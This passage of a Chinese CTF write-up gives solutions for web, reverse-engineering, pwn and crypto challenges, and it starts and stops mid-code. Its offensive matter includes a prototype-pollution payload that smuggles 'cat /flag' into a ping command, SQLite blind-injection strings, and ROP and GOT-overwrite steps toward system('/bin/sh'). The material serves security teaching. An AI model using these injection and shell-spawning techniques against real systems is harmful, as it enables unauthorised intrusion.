            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isValidIP</span><span class="p">(</span><span class="nx">ping</span><span class="p">.</span><span class="nx">ip</span><span class="p">))</span> <span class="p">{</span>
                <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">'invalid ip addr'</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">'need time parm'</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">ip</span> <span class="o">=</span> <span class="p">((</span><span class="nx">ping</span><span class="p">.</span><span class="nx">ip</span> <span class="o">!==</span> <span class="kc">undefined</span> <span class="o">&amp;&amp;</span> <span class="nx">ping</span><span class="p">.</span><span class="nx">ip</span> <span class="o">!=</span> <span class="s1">''</span><span class="p">)</span> <span class="o">?</span> <span class="nx">ping</span><span class="p">.</span><span class="nx">ip</span><span class="o">:</span> <span class="s1">'114.114.114.114'</span><span class="p">);</span>
    <span class="nx">nodeCmd</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="s1">'ping -c '</span> <span class="o">+</span> <span class="nx">time</span> <span class="o">+</span> <span class="s1">' '</span> <span class="o">+</span> <span class="nx">ip</span><span class="p">,</span> <span class="c1">//WINDOWS USE -n</span>
    <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">});</span>

<span class="p">});</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span>
<span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">'index'</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/index'</span><span class="p">,</span>
<span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">'&lt;title&gt;ping test&lt;/title&gt;&lt;form action="/ping" method="POST"&gt;Ip:&lt;input type="text" name="ping[ip]"" placeholder="default value 114 dns"&gt;&lt;br&gt;Times:&lt;input type="text" name="ping[time]"  value="1"&gt;&lt;input type="submit" value="Ping !"&gt;&lt;/form&gt; '</span><span class="p">);</span>
<span class="p">});</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">);</span>
</pre></div>
<p>/ping 路由内有命令执行操作 但是ip经过严格的正则校验 无法绕过,time也有强制类型转换.<br/>
只能想办法绕过这个校验.<br/>
通读代码发现当输入参数数量为1且参数为time时不会校验flag内容.<br/>
在后续还会使用三元运算符判断ip是否为空.<br/>
构造原型污染 污染ping数组的原型 即可完成以上条件 达到命令执行的效果.</p>
<pre><code>ping[__proto__][ip]=|cat /flag&amp;ping[time]=10</code></pre>
<h3 data-content="1" id="4cdece95bd5b814032fa52d8038742e5">14 wschat</h3>
<p>一个 nodejs+sqllite写的轻量聊天室<br/>
难度:?<br/>
本题考察特殊sql注入点的利用<br/>
现在使用ws协议的网站越来越多 (出题时我就想到了为什么不出一道题目来学学ws注入)<br/>
题目也使用了protobuf这是一种像json的结构化数据,在现在的httprpc中也非常常见.<br/>
该题前后端交互使用了socket.io，通信使用protobuf做结构化数据.<br/>
前端代码做了轻度混淆,并且具有反调试功能.<br/>
阅读前端代码发现,用户输入存在正则校验.<br/>
开始解题<br/>
去除反调试和正则校验(修改js)<br/>
手动测试发现注入点<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122632-e26cf462-491c-1.png"/><br/>
登陆处存在注入<br/>
猜测语句为select xx from xx where xx='username'<br/>
注册一个账号adad 使用布尔注入<br/>
sqlite的布尔盲注方法</p>
<pre><code>判断表数量
adad' and (select count(*) from sqlite_master where type='table')=5  -- 
表名
and substr((select name from sqlite_master where type='table' limit 0,1),1,1)='T'
列名
and substr((SELECT sql FROM sqlite_master where name='user_table'),33,1)='I'
记录
and substr((SELECT f16g FROM f16g_1s_1n_th1s_table),1,1)='f'</code></pre>
<p>本题有两种解题方法<br/>
第一种方法<br/>
编写js脚本在浏览器运行 进行注入.<br/>
第二种方法非常复杂 脱离浏览器编写脚本直接与ws后端通信.<br/>
可惜在比赛结束前没有队伍解出这道题.但是在结束后or4nge团队提交了这道题目的wp 且使用了第二种方法.完美地完成了该题. 大家有兴趣可以看看or4nge战队大佬的<a href="user_cancel" target="_blank">题解</a><br/>
（<a href="https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/#wschat" target="_blank">https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/#wschat</a>）</p>
<h1 data-content="1" id="ea513de592f33ffeb00de04d041ff2f4">RE</h1>
<h3 data-content="1" id="2244d753dac9eddf4dc51516aa8d03d9">15 signin</h3>
<p>直接查看字符串表即可获得flag</p>
<h3 data-content="1" id="d0168e6dabceb066244833e4b665f0ec">16 happyCTF</h3>
<p>这道题是用c++写的，其实代码核心很简单就只是单字节异或，所以把密文当成明文输入就能得到flag,只是验证的过程稍微麻烦，是一个递归验证的算法，不过没什么用换成strcmp效果是一样的，只是起到一个迷惑的作用，原始代码很简单，但是开启代码优化以后再用ida反编译看起来就很乱了，这也是起到迷惑作用。加密的核心部分是用lambda匿名函数实现的起到一个加密代码隐藏的作用，防止这个最简单的加密被直接找到，所以下一次试试把密文当成flag输入，说不定有惊喜</p>
<h3 data-content="1" id="f3810fb1782aba651c1f77f33a44e9d5">17 Remember Crypt 4</h3>
<p>如果对ctf常用的加密算法熟悉的话，看到ida的反汇编会很眼熟，这是一道很简单的rc4加密，该算法的特点是它可以自定义密码表，所以可以起到一点迷惑作用，但是没什么用，rc4是对称加密，所以只需把密文当成明文重新加密一边就能得到明文，所以碰到一些加密算法可以试试这个办法，万一是对称加密呢，直接就出flag了<br/>
贴一份rc4的代码</p>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">rc4_init</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="n">s</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="n">key</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">len</span><span class="p">)</span><span class="c1">//s最开始是传入的长度为256的char型空数组，用来存放初始化后的s</span>
<span class="c1">//key是密钥，内容可定义  //最后一个len是密钥的长度</span>
<span class="p">{</span>
 <span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
 <span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
 <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">k</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span><span class="o">=</span><span class="p">{};</span>
 <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">temp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">256</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">i</span><span class="p">;</span>         <span class="c1">//0-255赋给s</span>
  <span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="n">len</span><span class="p">];</span>   <span class="c1">//将k重新计算</span>
 <span class="p">}</span>
 <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">256</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="n">j</span><span class="o">=</span><span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">%</span><span class="mi">256</span><span class="p">;</span>    <span class="c1">//给j赋</span>
  <span class="n">temp</span><span class="o">=</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
  <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
  <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">=</span><span class="n">temp</span><span class="p">;</span>    <span class="c1">//s[i]和s[j]交换</span>
 <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<h3 data-content="1" id="4529926cd89c4d75c8883f2844a2db02">18 EasyRe</h3>
<p>题目是基于Linux Signal机制的VM题目，parent进程和child进程间通过signal通信，执行opcode，调试难度比较高。并且signal的注册在main函数之前。<br/>
具体解法可以参照or4nge战队以及chamd5团队给出的wp<br/>
（<a href="https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/#easyre" target="_blank">https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/#easyre</a>）<br/>
（<a href="https://mp.weixin.qq.com/s/KgxHOFH52EE8z7NnMTSIDA" target="_blank">https://mp.weixin.qq.com/s/KgxHOFH52EE8z7NnMTSIDA</a>）</p>
<h1 data-content="1" id="656deb54d26b02fc64b81380f6487ee0">PWN</h1>
<h3 data-content="1" id="4f78f7b070d8ba5b04e4982548db1f08">19 NssShop</h3>
<p>难度:签到题<br/>
真 签到题 不会PWN的同学也可以来试试<br/>
一道非常简单的整数溢出题<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122632-e2ab3aa6-491c-1.png"/><br/>
在计算总价格时会发生溢出<br/>
达成0元购(x)</p>
<h3 data-content="1" id="6f42e75ad7802c3aefcb75bc757ffd04">20 justdoit</h3>
<p>把软件载入ida看一看反编译，很普通，发现主函数调用了read(),然后又调用了这个read_long(),看一眼内容<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122633-e2d91c32-491c-1.png"/><br/>
没什么奇怪的地方，看看反汇编<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122633-e2e735ba-491c-1.png"/><br/>
发现了奇怪的指令，add rbp,rax,而rax是上面read_long中atoi的输出，所以我们可以控制一下rbp的值<br/>
题目很简单，没有pie所以可以用rop，没有canary所以可以用bof,也可以部分劫持got表,也给了libc,我们可以用puts_plt 来泄漏 libc 的地址，通过一些调试之后，发现可以在payload中再次调用main函数来控制4个块的payload<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122633-e313335e-491c-1.png"/><br/>
在堆栈里，我们将main地址推送到 0x7fffffffde70 并添加 rbp 到达 0x7fffffffde68 的ip<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122633-e33fc7b6-491c-1.png"/><br/>
然后当程序调用 leave,ret 时，rbp 会被设置为 = 0x00000a3131313131。<br/>
现在的 rsp 是 0x7ffffffffde78，但是在返回到 main 函数之后，有这两条指令<br/>
push rbp<br/>
和<br/>
mov rbp, rsp<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221011122634-e39561da-491c-1.png"/><br/>
看上面的堆栈图，红色块是前三个read_long()块里面的第二个，这个块我们可以放任意内容（块3需要放main地址,块1放string控制rbp）,然后用payload pop_rdi, address, puts, ret去泄露libc，然后返回main函数重用漏洞。<br/>
所以现在只需要放入payload pop_rdi、/bin/sh、system 然后控制 rbp 即可获得 shell。</p>
<h3 data-content="1" id="f7f6672cd15a9ad090ebfa12dd4e44ed">21 reallNeedGoodLuck</h3>
<p>这个题就比较有意思了，在IDA可以看到代码很简单，代码内容就是可以让你在任意地址写入4个字节，软件也没有pie所以地址都是固定的，也可以劫持got表。<br/>
首先，把exit GOT改成main，这样我们就有了main函数的无限循环。然后我们可以根据需要覆盖任意多次。<br/>
题目的一种比较明显的解法是把atoi函数更改为system，然后将字符串“/bin/sh”放入nptr变量中，然后在调用atoi("/bin/sh")时，程序将执行system(" /bin /sh")，然后get shell<br/>
所以问题就是如何替换到正确的地址，因为atoi已经调用过，所以got表中有其libc地址，所以通过用system<br/>
函数地址的最后三个字节覆盖原始地址的最后三个字节即可，需要一些好运</p>
<h3 data-content="1" id="a066da8b0d5c407769364467fd5c0724">22 iterator</h3>
<p>在处理迭代器时，没有合理的判断迭代器范围，导致了指针越界。合理布局内存可以覆写Vector的结构体，执行任意内存读写，最终劫持Got表。<br/>
此处可以参考地运团队dalao的wp：<br/>
<a href="https://mp.weixin.qq.com/s/C0Vn_5NnGCd8Sn6--otsgA" target="_blank">https://mp.weixin.qq.com/s/C0Vn_5NnGCd8Sn6--otsgA</a></p>
<h1 data-content="1" id="b4f2283afa68b515f2a2f90682b0fb3a">CRYPTO</h1>
<h3 data-content="1" id="cf7d92336b082f7574b0d886abf9f2f7">23 EzDES</h3>
<p>一轮des没有多轮s盒干扰，所以该题难度是对des加密流程和算法的了解，可以通过穷举密钥和差分分析等方法实现，该脚本主要的思想是将明文加密到一半得到s盒置换前的数据，将密文解密到一半得到s盒置换后的数据，异或这两组数据可得可能的des密钥，然后将可能的des密钥存储到数组中，比对3组明密文，即可得出密钥。多轮的des加密差分分析思想也是同理，通过多组明密文得出密钥的可能性，选择最大可能性的密钥。</p>
<div class="highlight"><pre><span></span><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="c1"># Plaintext = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'A', 'B', 'C', 'D', 'E', 'F']</span>
<span class="k">def</span> <span class="nf">twoto16</span><span class="p">(</span><span class="n">new_p_box_list</span><span class="p">):</span>
    <span class="nb">str</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="nb">sum</span> <span class="o">=</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">3</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">2</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">1</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">0</span>
        <span class="c1">#print(sum)</span>
        <span class="nb">str</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">sum</span><span class="p">))</span>
    <span class="k">return</span> <span class="nb">str</span>
<span class="c1"># 进制转换 十六进制转换二进制以及二进制转换为十六进制数</span>
<span class="k">def</span> <span class="nf">hex_to_binary</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
    <span class="n">initialplaintext</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">initialresult</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span><span class="mi">16</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
    <span class="n">initialresult</span> <span class="o">=</span> <span class="n">initialresult</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">initialresult</span><span class="p">)):</span>
            <span class="n">initialplaintext</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">initialresult</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">initialplaintext</span>

<span class="k">def</span> <span class="nf">binary_to_hexadecimal</span><span class="p">(</span><span class="n">bin_list</span><span class="p">):</span>
    <span class="n">bin_str</span> <span class="o">=</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">bin_list</span><span class="p">)</span>
    <span class="n">hstr</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">bin_str</span><span class="p">,</span> <span class="mi">2</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
    <span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">bin_str</span><span class="p">)</span> <span class="o">//</span> <span class="mi">4</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">hstr</span><span class="p">)):</span>
        <span class="n">hstr</span> <span class="o">=</span> <span class="s2">"0"</span> <span class="o">+</span> <span class="n">hstr</span>
    <span class="k">return</span> <span class="n">hstr</span>

<span class="c1">#初始置换IP</span>
<span class="n">_ip</span> <span class="o">=</span> <span class="p">[</span><span class="mi">57</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span>
       <span class="mi">59</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span>
       <span class="mi">61</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span>
       <span class="mi">63</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span>
       <span class="mi">56</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
       <span class="mi">58</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span>
       <span class="mi">60</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span>
       <span class="mi">62</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">6</span>
       <span class="p">]</span>

<span class="k">def</span> <span class="nf">substitution</span><span class="p">(</span><span class="n">table</span><span class="p">):</span>
    <span class="n">result_table</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">64</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="p">:</span>
        <span class="n">result_table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">table</span><span class="p">[</span><span class="n">_ip</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span>
    <span class="k">return</span>  <span class="n">result_table</span>

<span class="c1">#初始逆置换IP</span>
<span class="n">_fp</span> <span class="o">=</span> <span class="p">[</span><span class="mi">39</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span>
       <span class="mi">38</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">62</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span>
       <span class="mi">37</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span>
       <span class="mi">36</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">60</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span>
       <span class="mi">35</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span>
       <span class="mi">34</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span>
       <span class="mi">33</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span>
       <span class="mi">32</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">24</span>
       <span class="p">]</span>
<span class="n">_fp2</span> <span class="o">=</span> <span class="p">[</span><span class="mi">57</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span>
        <span class="mi">59</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span>
        <span class="mi">61</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span>
        <span class="mi">63</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span>
        <span class="mi">56</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
        <span class="mi">58</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span>
        <span class="mi">60</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span>
        <span class="mi">62</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span>
        <span class="p">]</span>

<span class="k">def</span> <span class="nf">inverse_substitution</span><span class="p">(</span><span class="n">table</span><span class="p">)</span> <span class="p">:</span>
    <span class="n">result_table</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span><span class="mi">64</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="p">:</span>
        <span class="n">result_table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">table</span><span class="p">[</span><span class="n">_fp</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span>
    <span class="k">return</span> <span class="n">result_table</span>
<span class="k">def</span> <span class="nf">reverse_substitution</span><span class="p">(</span><span class="n">table</span><span class="p">):</span>
    <span class="n">result_table</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">64</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
        <span class="n">result_table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">table</span><span class="p">[</span><span class="n">_fp2</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span>
    <span class="k">return</span> <span class="n">result_table</span>

<span class="c1">#扩展置换</span>
<span class="n">_extend_table</span> <span class="o">=</span> <span class="p">[</span>
                <span class="mi">31</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span>
                <span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span>
                <span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span>
                <span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span>
                <span class="mi">15</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span>
                <span class="mi">19</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span>
                <span class="mi">23</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span>
